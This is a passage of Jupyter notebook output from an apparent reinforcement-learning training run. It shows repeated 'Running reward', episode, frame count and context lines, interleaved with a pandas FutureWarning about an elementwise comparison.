      "Running reward: 11.00\t Episode 390\t Frame count: 203000\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 391\t Frame count: 203100\t Context: 1\n",
      "Running reward: 11.00\t Episode 391\t Frame count: 203200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 391\t Frame count: 203300\t Context: 1\n",
      "Running reward: 11.00\t Episode 391\t Frame count: 203400\t Context: 1\n",
      "Running reward: 11.00\t Episode 392\t Frame count: 203500\t Context: 1\n",
      "Running reward: 11.00\t Episode 392\t Frame count: 203600\t Context: 2\n",
      "Running reward: 11.00\t Episode 393\t Frame count: 203700\t Context: 1\n",
      "Running reward: 11.00\t Episode 393\t Frame count: 203800\t Context: 1\n",
      "Running reward: 11.00\t Episode 393\t Frame count: 203900\t Context: 1\n",
      "Running reward: 11.00\t Episode 393\t Frame count: 204000\t Context: 1\n",
      "Running reward: 11.00\t Episode 393\t Frame count: 204100\t Context: 1\n",
      "Running reward: 11.00\t Episode 393\t Frame count: 204200\t Context: 2\n",
      "Running reward: 11.00\t Episode 393\t Frame count: 204300\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 394\t Frame count: 204400\t Context: 1\n",
      "Running reward: 11.00\t Episode 394\t Frame count: 204500\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 395\t Frame count: 204600\t Context: 1\n",
      "Running reward: 11.00\t Episode 395\t Frame count: 204700\t Context: 1\n",
      "Running reward: 11.00\t Episode 395\t Frame count: 204800\t Context: 1\n",
      "Running reward: 11.00\t Episode 395\t Frame count: 204900\t Context: 2\n",
      "Running reward: 11.00\t Episode 396\t Frame count: 205000\t Context: 1\n",
      "Running reward: 11.00\t Episode 396\t Frame count: 205100\t Context: 1\n",
      "Running reward: 11.00\t Episode 396\t Frame count: 205200\t Context: 1\n",
      "Running reward: 11.00\t Episode 396\t Frame count: 205300\t Context: 1\n",
      "Running reward: 11.00\t Episode 396\t Frame count: 205400\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 396\t Frame count: 205500\t Context: 2\n",
      "Running reward: 11.00\t Episode 396\t Frame count: 205600\t Context: 2\n",
      "Running reward: 11.00\t Episode 396\t Frame count: 205700\t Context: 2\n",
      "Running reward: 11.00\t Episode 396\t Frame count: 205800\t Context: 2\n",
      "Running reward: 11.00\t Episode 396\t Frame count: 205900\t Context: 2\n",
      "Running reward: 11.00\t Episode 396\t Frame count: 206000\t Context: 2\n",
      "Running reward: 11.00\t Episode 397\t Frame count: 206100\t Context: 1\n",
      "Running reward: 11.00\t Episode 397\t Frame count: 206200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 397\t Frame count: 206300\t Context: 1\n",
      "Running reward: 11.00\t Episode 397\t Frame count: 206400\t Context: 1\n",
      "Running reward: 11.00\t Episode 397\t Frame count: 206500\t Context: 2\n",
      "Running reward: 11.00\t Episode 399\t Frame count: 206600\t Context: 1\n",
      "Running reward: 11.00\t Episode 399\t Frame count: 206700\t Context: 1\n",
      "Running reward: 11.00\t Episode 399\t Frame count: 206800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 399\t Frame count: 206900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 399\t Frame count: 207000\t Context: 1\n",
      "Running reward: 11.00\t Episode 399\t Frame count: 207100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 399\t Frame count: 207200\t Context: 2\n",
      "Running reward: 11.00\t Episode 399\t Frame count: 207300\t Context: 2\n",
      "Running reward: 11.00\t Episode 399\t Frame count: 207400\t Context: 2\n",
      "Running reward: 11.00\t Episode 399\t Frame count: 207500\t Context: 2\n",
      "Running reward: 11.00\t Episode 399\t Frame count: 207600\t Context: 2\n",
      "Running reward: 11.00\t Episode 399\t Frame count: 207700\t Context: 2\n",
      "Running reward: 11.00\t Episode 400\t Frame count: 207800\t Context: 1\n",
      "Running reward: 11.00\t Episode 400\t Frame count: 207900\t Context: 2\n",
      "Running reward: 11.00\t Episode 400\t Frame count: 208000\t Context: 2\n",
      "Running reward: 11.00\t Episode 400\t Frame count: 208100\t Context: 2\n",
      "Running reward: 11.00\t Episode 400\t Frame count: 208200\t Context: 2\n",
      "Running reward: 11.00\t Episode 400\t Frame count: 208300\t Context: 2\n",
      "Running reward: 11.00\t Episode 400\t Frame count: 208400\t Context: 2\n",
      "Running reward: 11.00\t Episode 401\t Frame count: 208500\t Context: 1\n",
      "Running reward: 11.00\t Episode 401\t Frame count: 208600\t Context: 2\n",
      "Running reward: 11.00\t Episode 401\t Frame count: 208700\t Context: 2\n",
      "Running reward: 11.00\t Episode 401\t Frame count: 208800\t Context: 2\n",
      "Running reward: 11.00\t Episode 401\t Frame count: 208900\t Context: 2\n",
      "Running reward: 11.00\t Episode 401\t Frame count: 209000\t Context: 2\n",
      "Running reward: 11.00\t Episode 401\t Frame count: 209100\t Context: 2\n",
      "Running reward: 11.00\t Episode 401\t Frame count: 209200\t Context: 2\n",
      "Running reward: 11.00\t Episode 401\t Frame count: 209300\t Context: 2\n",
      "Running reward: 11.00\t Episode 401\t Frame count: 209400\t Context: 2\n",
      "Running reward: 11.00\t Episode 401\t Frame count: 209500\t Context: 2\n",
      "Running reward: 11.00\t Episode 401\t Frame count: 209600\t Context: 2\n",
      "Running reward: 11.00\t Episode 402\t Frame count: 209700\t Context: 1\n",
      "Running reward: 11.00\t Episode 402\t Frame count: 209800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 402\t Frame count: 209900\t Context: 1\n",
      "Running reward: 11.00\t Episode 402\t Frame count: 210000\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 402\t Frame count: 210100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 402\t Frame count: 210200\t Context: 1\n",
      "Running reward: 11.00\t Episode 402\t Frame count: 210300\t Context: 1\n",
      "Running reward: 11.00\t Episode 402\t Frame count: 210400\t Context: 1\n",
      "Running reward: 11.00\t Episode 402\t Frame count: 210500\t Context: 1\n",
      "Running reward: 11.00\t Episode 402\t Frame count: 210600\t Context: 1\n",
      "Running reward: 11.00\t Episode 402\t Frame count: 210700\t Context: 1\n",
      "Running reward: 11.00\t Episode 403\t Frame count: 210800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 403\t Frame count: 210900\t Context: 1\n",
      "Running reward: 11.00\t Episode 403\t Frame count: 211000\t Context: 1\n",
      "Running reward: 11.00\t Episode 403\t Frame count: 211100\t Context: 1\n",
      "Running reward: 11.00\t Episode 403\t Frame count: 211200\t Context: 1\n",
      "Running reward: 11.00\t Episode 403\t Frame count: 211300\t Context: 2\n",
      "Running reward: 11.00\t Episode 403\t Frame count: 211400\t Context: 2\n",
      "Running reward: 11.00\t Episode 403\t Frame count: 211500\t Context: 2\n",
      "Running reward: 11.00\t Episode 403\t Frame count: 211600\t Context: 2\n",
      "Running reward: 11.00\t Episode 403\t Frame count: 211700\t Context: 2\n",
      "Running reward: 11.00\t Episode 403\t Frame count: 211800\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 403\t Frame count: 211900\t Context: 2\n",
      "Running reward: 11.00\t Episode 403\t Frame count: 212000\t Context: 2\n",
      "Running reward: 11.00\t Episode 404\t Frame count: 212100\t Context: 1\n",
      "Running reward: 11.00\t Episode 404\t Frame count: 212200\t Context: 1\n",
      "Running reward: 11.00\t Episode 404\t Frame count: 212300\t Context: 2\n",
      "Running reward: 11.00\t Episode 404\t Frame count: 212400\t Context: 2\n",
      "Running reward: 11.00\t Episode 404\t Frame count: 212500\t Context: 2\n",
      "Running reward: 11.00\t Episode 404\t Frame count: 212600\t Context: 2\n",
      "Running reward: 11.00\t Episode 404\t Frame count: 212700\t Context: 2\n",
      "Running reward: 11.00\t Episode 404\t Frame count: 212800\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 404\t Frame count: 212900\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 404\t Frame count: 213000\t Context: 2\n",
      "Running reward: 11.00\t Episode 405\t Frame count: 213100\t Context: 1\n",
      "Running reward: 11.00\t Episode 405\t Frame count: 213200\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 405\t Frame count: 213300\t Context: 2\n",
      "Running reward: 11.00\t Episode 405\t Frame count: 213400\t Context: 2\n",
      "Running reward: 11.00\t Episode 405\t Frame count: 213500\t Context: 2\n",
      "Running reward: 11.00\t Episode 405\t Frame count: 213600\t Context: 2\n",
      "Running reward: 11.00\t Episode 405\t Frame count: 213700\t Context: 2\n",
      "Running reward: 11.00\t Episode 405\t Frame count: 213800\t Context: 2\n",
      "Running reward: 11.00\t Episode 406\t Frame count: 213900\t Context: 1\n",
      "Running reward: 11.00\t Episode 406\t Frame count: 214000\t Context: 1\n",
      "Running reward: 11.00\t Episode 406\t Frame count: 214100\t Context: 1\n",
      "Running reward: 11.00\t Episode 406\t Frame count: 214200\t Context: 1\n",
      "Running reward: 11.00\t Episode 406\t Frame count: 214300\t Context: 1\n",
      "Running reward: 11.00\t Episode 406\t Frame count: 214400\t Context: 1\n",
      "Running reward: 11.00\t Episode 406\t Frame count: 214500\t Context: 1\n",
      "Running reward: 11.00\t Episode 406\t Frame count: 214600\t Context: 1\n",
      "Running reward: 11.00\t Episode 406\t Frame count: 214700\t Context: 1\n",
      "Running reward: 11.00\t Episode 406\t Frame count: 214800\t Context: 1\n",
      "Running reward: 11.00\t Episode 406\t Frame count: 214900\t Context: 1\n",
      "Running reward: 11.00\t Episode 406\t Frame count: 215000\t Context: 1\n",
      "Running reward: 11.00\t Episode 406\t Frame count: 215100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 406\t Frame count: 215200\t Context: 1\n",
      "Running reward: 11.00\t Episode 406\t Frame count: 215300\t Context: 1\n",
      "Running reward: 11.00\t Episode 406\t Frame count: 215400\t Context: 1\n",
      "Running reward: 11.00\t Episode 406\t Frame count: 215500\t Context: 1\n",
      "Running reward: 11.00\t Episode 406\t Frame count: 215600\t Context: 1\n",
      "Running reward: 11.00\t Episode 406\t Frame count: 215700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 406\t Frame count: 215800\t Context: 2\n",
      "Running reward: 11.00\t Episode 406\t Frame count: 215900\t Context: 2\n",
      "Running reward: 11.00\t Episode 407\t Frame count: 216000\t Context: 2\n",
      "Running reward: 11.00\t Episode 408\t Frame count: 216100\t Context: 1\n",
      "Running reward: 11.00\t Episode 408\t Frame count: 216200\t Context: 1\n",
      "Running reward: 11.00\t Episode 409\t Frame count: 216300\t Context: 1\n",
      "Running reward: 11.00\t Episode 409\t Frame count: 216400\t Context: 2\n",
      "Running reward: 11.00\t Episode 409\t Frame count: 216500\t Context: 2\n",
      "Running reward: 11.00\t Episode 410\t Frame count: 216600\t Context: 2\n",
      "Running reward: 11.00\t Episode 410\t Frame count: 216700\t Context: 2\n",
      "Running reward: 11.00\t Episode 410\t Frame count: 216800\t Context: 2\n",
      "Running reward: 11.00\t Episode 411\t Frame count: 216900\t Context: 1\n",
      "Running reward: 11.00\t Episode 411\t Frame count: 217000\t Context: 2\n",
      "Running reward: 11.00\t Episode 412\t Frame count: 217100\t Context: 1\n",
      "Running reward: 11.00\t Episode 412\t Frame count: 217200\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 412\t Frame count: 217300\t Context: 1\n",
      "Running reward: 11.00\t Episode 412\t Frame count: 217400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 412\t Frame count: 217500\t Context: 1\n",
      "Running reward: 11.00\t Episode 412\t Frame count: 217600\t Context: 2\n",
      "Running reward: 11.00\t Episode 412\t Frame count: 217700\t Context: 2\n",
      "Running reward: 11.00\t Episode 413\t Frame count: 217800\t Context: 1\n",
      "Running reward: 11.00\t Episode 413\t Frame count: 217900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 413\t Frame count: 218000\t Context: 2\n",
      "Running reward: 11.00\t Episode 414\t Frame count: 218100\t Context: 1\n",
      "Running reward: 11.00\t Episode 414\t Frame count: 218200\t Context: 1\n",
      "Running reward: 11.00\t Episode 414\t Frame count: 218300\t Context: 2\n",
      "Running reward: 11.00\t Episode 414\t Frame count: 218400\t Context: 2\n",
      "Running reward: 11.00\t Episode 414\t Frame count: 218500\t Context: 2\n",
      "Running reward: 11.00\t Episode 414\t Frame count: 218600\t Context: 2\n",
      "Running reward: 11.00\t Episode 414\t Frame count: 218700\t Context: 2\n",
      "Running reward: 11.00\t Episode 415\t Frame count: 218800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 415\t Frame count: 218900\t Context: 1\n",
      "Running reward: 11.00\t Episode 415\t Frame count: 219000\t Context: 1\n",
      "Running reward: 11.00\t Episode 415\t Frame count: 219100\t Context: 2\n",
      "Running reward: 11.00\t Episode 416\t Frame count: 219200\t Context: 1\n",
      "Running reward: 11.00\t Episode 416\t Frame count: 219300\t Context: 1\n",
      "Running reward: 11.00\t Episode 416\t Frame count: 219400\t Context: 1\n",
      "Running reward: 11.00\t Episode 416\t Frame count: 219500\t Context: 1\n",
      "Running reward: 11.00\t Episode 416\t Frame count: 219600\t Context: 1\n",
      "Running reward: 11.00\t Episode 416\t Frame count: 219700\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 416\t Frame count: 219800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 416\t Frame count: 219900\t Context: 1\n",
      "Running reward: 11.00\t Episode 416\t Frame count: 220000\t Context: 2\n",
      "Running reward: 11.00\t Episode 417\t Frame count: 220100\t Context: 1\n",
      "Running reward: 11.00\t Episode 417\t Frame count: 220200\t Context: 1\n",
      "Running reward: 11.00\t Episode 417\t Frame count: 220300\t Context: 2\n",
      "Running reward: 11.00\t Episode 417\t Frame count: 220400\t Context: 2\n",
      "Running reward: 11.00\t Episode 418\t Frame count: 220500\t Context: 1\n",
      "Running reward: 11.00\t Episode 418\t Frame count: 220600\t Context: 1\n",
      "Running reward: 11.00\t Episode 418\t Frame count: 220700\t Context: 2\n",
      "Running reward: 11.00\t Episode 418\t Frame count: 220800\t Context: 2\n",
      "Running reward: 11.00\t Episode 418\t Frame count: 220900\t Context: 2\n",
      "Running reward: 11.00\t Episode 419\t Frame count: 221000\t Context: 1\n",
      "Running reward: 11.00\t Episode 420\t Frame count: 221100\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 420\t Frame count: 221200\t Context: 1\n",
      "Running reward: 11.00\t Episode 420\t Frame count: 221300\t Context: 1\n",
      "Running reward: 11.00\t Episode 420\t Frame count: 221400\t Context: 1\n",
      "Running reward: 11.00\t Episode 420\t Frame count: 221500\t Context: 2\n",
      "Running reward: 11.00\t Episode 420\t Frame count: 221600\t Context: 2\n",
      "Running reward: 11.00\t Episode 420\t Frame count: 221700\t Context: 2\n",
      "Running reward: 11.00\t Episode 420\t Frame count: 221800\t Context: 2\n",
      "Running reward: 11.00\t Episode 420\t Frame count: 221900\t Context: 2\n",
      "Running reward: 11.00\t Episode 420\t Frame count: 222000\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 420\t Frame count: 222100\t Context: 2\n",
      "Running reward: 11.00\t Episode 420\t Frame count: 222200\t Context: 2\n",
      "Running reward: 11.00\t Episode 420\t Frame count: 222300\t Context: 2\n",
      "Running reward: 11.00\t Episode 420\t Frame count: 222400\t Context: 2\n",
      "Running reward: 11.00\t Episode 420\t Frame count: 222500\t Context: 2\n",
      "Running reward: 11.00\t Episode 421\t Frame count: 222600\t Context: 1\n",
      "Running reward: 11.00\t Episode 421\t Frame count: 222700\t Context: 1\n",
      "Running reward: 11.00\t Episode 421\t Frame count: 222800\t Context: 1\n",
      "Running reward: 11.00\t Episode 421\t Frame count: 222900\t Context: 1\n",
      "Running reward: 11.00\t Episode 421\t Frame count: 223000\t Context: 1\n",
      "Running reward: 11.00\t Episode 421\t Frame count: 223100\t Context: 1\n",
      "Running reward: 11.00\t Episode 421\t Frame count: 223200\t Context: 1\n",
      "Running reward: 11.00\t Episode 421\t Frame count: 223300\t Context: 2\n",
      "Running reward: 11.00\t Episode 422\t Frame count: 223400\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 422\t Frame count: 223500\t Context: 1\n",
      "Running reward: 11.00\t Episode 422\t Frame count: 223600\t Context: 1\n",
      "Running reward: 11.00\t Episode 422\t Frame count: 223700\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 423\t Frame count: 223800\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 423\t Frame count: 223900\t Context: 1\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 423\t Frame count: 224000\t Context: 1\n",
      "Running reward: 11.00\t Episode 423\t Frame count: 224100\t Context: 1\n",
      "Running reward: 11.00\t Episode 423\t Frame count: 224200\t Context: 1\n",
      "Running reward: 11.00\t Episode 423\t Frame count: 224300\t Context: 1\n",
      "Running reward: 11.00\t Episode 423\t Frame count: 224400\t Context: 1\n",
      "Running reward: 11.00\t Episode 423\t Frame count: 224500\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_18972\\1008889039.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 11.00\t Episode 423\t Frame count: 224600\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
